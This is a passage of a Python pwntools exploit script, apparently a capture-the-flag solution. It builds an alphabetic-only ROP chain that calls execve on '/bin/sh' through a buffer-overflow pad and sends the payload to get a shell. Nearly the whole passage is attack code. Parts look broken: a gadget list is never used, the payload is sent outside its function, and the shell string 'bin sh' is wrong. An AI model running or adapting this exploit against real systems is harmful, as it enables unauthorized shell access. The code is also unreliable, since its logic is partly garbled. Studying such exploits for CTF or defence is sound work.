    return all(c.isalpha() or c == ' ' for c in s)

    gadgets = []
    for section in elf.sections:
        if section.name == ".text":
            start = section.header.sh_addr
            end = start + section.header.sh_size
            data = section.data()
            for i in range(len(data)-2):
                # Check if gadget addr contains only alpha chars
                addr = start + i
                if all(chr(c).isalpha() or chr(c) == ' ' for c in p64(addr)):
                    gadgets.append(addr)
    return gadgets

# Find alphabetic-only string for "/bin/sh"
def find_alpha_str():
    for section in elf.sections:
        if section.name == ".data" or section.name == ".bss":
            start = section.header.sh_addr
            data = section.data()
            for i in range(len(data)-7):
                addr = start + i
                if all(chr(c).isalpha() or chr(c) == ' ' for c in p64(addr)):
                    return addr
    return None

# Build reverse ROP chain
def build_rop_chain():
    rop = b""
    
    # Find useful gadgets
    pop_rdi = next(elf.search(asm('pop rdi; ret')))
    pop_rsi = next(elf.search(asm('pop rsi; ret')))
    pop_rax = next(elf.search(asm('pop rax; ret')))
    syscall = next(elf.search(asm('syscall')))
    
    # Find place to store "/bin/sh"
    bss_addr = list(elf.search(b"A"*8))[0]  # Find writable area
    
    # Build chain backwards
    chain = [
        pop_rdi,
        bss_addr,       # /bin/sh string location
        pop_rsi,
        0,             # NULL
        pop_rax,
        0x3b,         # execve syscall
        syscall
    ]
    
    # Add padding and build chain
    pad = cyclic(0x828)  # Buffer size from binary analysis
    payload = pad
    for gadget in chain:
        if not is_alpha_or_space(p64(gadget)):
            log.error(f"Non-alphabetic gadget found: {hex(gadget)}")
            continue
        payload += p64(gadget)
    
    return payload

# Send the payload

p.sendline(payload)

# Send "/bin/sh\x00" - must be alphabetic only
shell_str = b"bin sh  "  # Using spaces to make it alphabetic
p.sendline(shell_str)

# Get shell
